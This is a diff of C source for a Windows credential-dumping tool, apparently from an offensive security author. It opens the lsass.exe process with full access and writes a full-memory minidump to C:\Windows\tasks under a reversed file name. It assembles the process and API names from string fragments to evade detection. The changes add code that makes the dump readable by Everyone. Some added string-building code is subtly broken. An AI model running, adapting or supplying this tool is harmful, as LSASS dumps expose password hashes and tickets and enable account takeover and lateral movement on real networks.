@@ -3,16 +3,17 @@
     Author: vari.sh
 
     Description: This program implements LSASS dump
-                 
+
 */
 
 #define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
 #include <tlhelp32.h>
 #include <dbghelp.h>
-#include <tchar.h>
 #include <stdio.h>
+#include <aclapi.h> 
 
+// Define the function pointer type for MiniDumpWriteDump
 typedef BOOL(WINAPI* PFN_MiniDumpWriteDump)(
     HANDLE hProcess,
     DWORD ProcessId,
@@ -23,14 +24,33 @@ typedef BOOL(WINAPI* PFN_MiniDumpWriteDump)(
     PMINIDUMP_CALLBACK_INFORMATION CallbackParam
     );
 
-int _tmain(void)
+// Loads a clean copy of dbghelp.dll from the system directory
+HMODULE LoadCleanDbghelp()
 {
-    TCHAR part1[] = _T("lsa");
-    TCHAR part2[] = _T("ss");
-    TCHAR part3[] = _T(".ex");
-    TCHAR part4[] = _T("e");
-    TCHAR targetProcessName[50] = { 0 };
-    _stprintf(targetProcessName, _T("%s%s%s%s"), part1, part2, part3, part4);
+    char dllPath[] = "C:\\Windows\\System32\\dbghelp.dll";
+
+    HMODULE hDbghelp = LoadLibraryA(dllPath);
+    if (hDbghelp)
+    {
+        printf("Loaded clean copy of dbghelp.dll at: %p\n", hDbghelp);
+    }
+    else
+    {
+        printf("Failed to load dbghelp.dll. Error: %lu\n", GetLastError());
+    }
+
+    return hDbghelp;
+}
+
+int main(void)
+{
+    // Build the target process name: "lsass.exe"
+    wchar_t part1[] = L"ls";
+    wchar_t part2[] = L"ass";
+    wchar_t part3[] = L".ex";
+    wchar_t part4[] = L"e";
+    char targetProcessName[50] = { 0 };
+    swprintf(targetProcessName, "%s%s%s%s", part1, part2, part3, part4);
 
     DWORD targetPID = 0;
 
@@ -38,7 +58,7 @@ int _tmain(void)
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE)
     {
-        _tprintf(_T("Unable to create process snapshot.\n"));
+        printf("Unable to create process snapshot.\n");
         return 1;
     }
 
@@ -48,7 +68,7 @@ int _tmain(void)
     {
         do
         {
-            if (_tcsicmp(pe.szExeFile, targetProcessName) == 0)
+            if (_stricmp(pe.szExeFile, targetProcessName) == 0)
             {
                 targetPID = pe.th32ProcessID;
                 break;
@@ -59,20 +79,23 @@ int _tmain(void)
 
     if (targetPID == 0)
     {
-        _tprintf(_T("Target process not found.\n"));
+        printf("Target process not found.\n");
         return 1;
     }
 
-    // Open the target process with all privileges (requires elevation)
+    // Open the target process with full access (requires elevation)
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
     if (!hProcess)
     {
-        _tprintf(_T("Unable to open target process (PID: %lu).\n"), targetPID);
+        printf("Unable to open target process (PID: %lu).\n", targetPID);
         return 1;
     }
 
+    // Define the dump file path
+    const char* dumpFilePath = "C:\\Windows\\tasks\\ssasl.dmp";
+
     // Create the dump file
-    HANDLE hFile = CreateFile(_T("C:\\Windows\\tasks\\ssasl.dmp"),
+    HANDLE hFile = CreateFileA(dumpFilePath,
         GENERIC_WRITE,
         0,
         NULL,
@@ -81,20 +104,20 @@ int _tmain(void)
         NULL);
     if (hFile == INVALID_HANDLE_VALUE)
     {
-        _tprintf(_T("Unable to create dump file.\n"));
+        printf("Unable to create dump file.\n");
         CloseHandle(hProcess);
         return 1;
     }
 
-    HMODULE hDbghelp = LoadLibrary(_T("dbghelp.dll"));
+    HMODULE hDbghelp = LoadCleanDbghelp();
     if (!hDbghelp)
     {
-        _tprintf(_T("Unable to load dbghelp.dll.\n"));
         CloseHandle(hFile);
         CloseHandle(hProcess);
         return 1;
     }
 
+    // Build the function name: "MiniDumpWriteDump"
     char mdPart1[] = "Mini";
     char mdPart2[] = "Dump";
     char mdPart3[] = "Write";
@@ -105,37 +128,73 @@ int _tmain(void)
     PFN_MiniDumpWriteDump pMiniDumpWriteDump = (PFN_MiniDumpWriteDump)GetProcAddress(hDbghelp, miniFuncName);
     if (!pMiniDumpWriteDump)
     {
-        _tprintf(_T("Unable to retrieve the address of MiniDumpWriteDump.\n"));
+        printf("Unable to retrieve MiniDumpWriteDump address.\n");
         FreeLibrary(hDbghelp);
         CloseHandle(hFile);
         CloseHandle(hProcess);
         return 1;
     }
 
-    // Perform a dump of the target process
+    // Dump the target process
     BOOL dumped = pMiniDumpWriteDump(
-        hProcess,               // Handle to the target process
+        hProcess,               // Handle to target process
         targetPID,              // Process ID
-        hFile,                  // Handle to the dump file
+        hFile,                  // Handle to dump file
         MiniDumpWithFullMemory, // Dump type
-        NULL,                   // Exception param
-        NULL,                   // User stream param
-        NULL                    // Callback param
+        NULL,                   // Exception parameter
+        NULL,                   // User stream parameter
+        NULL                    // Callback parameter
     );
 
     if (dumped)
     {
-        _tprintf(_T("Dump completed.\n"));
+        printf("Dump completed.\n");
     }
     else
     {
-        _tprintf(_T("Dump failed. Error code: %lu\n"), GetLastError());
+        printf("Dump failed. Error code: %lu\n", GetLastError());
     }
 
-    // Clean up resources
+    // Clean up resources before modifying file permissions
     FreeLibrary(hDbghelp);
     CloseHandle(hFile);
     CloseHandle(hProcess);
+
+    // Set file permissions to grant GENERIC_READ to Everyone
+    DWORD dwRes;
+    EXPLICIT_ACCESS ea;
+    PACL pNewDACL = NULL;
+
+    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
+    ea.grfAccessPermissions = GENERIC_READ;
+    ea.grfAccessMode = SET_ACCESS;
+    ea.grfInheritance = NO_INHERITANCE;
+    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
+    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
+    ea.Trustee.ptstrName = L"Everyone";
+
+    dwRes = SetEntriesInAcl(1, &ea, NULL, &pNewDACL);
+    if (dwRes != ERROR_SUCCESS)
+    {
+        printf("Failed to set entries in ACL. Error: %lu\n", dwRes);
+    }
+    else
+    {
+        dwRes = SetNamedSecurityInfoA(
+            (LPSTR)dumpFilePath,
+            SE_FILE_OBJECT,
+            DACL_SECURITY_INFORMATION,
+            NULL,
+            NULL,
+            pNewDACL,
+            NULL);
+        if (dwRes != ERROR_SUCCESS)
+        {
+            printf("Failed to set security info. Error: %lu\n", dwRes);
+        }
+    }
+    if (pNewDACL)
+        LocalFree(pNewDACL);
 
     return 0;
 }
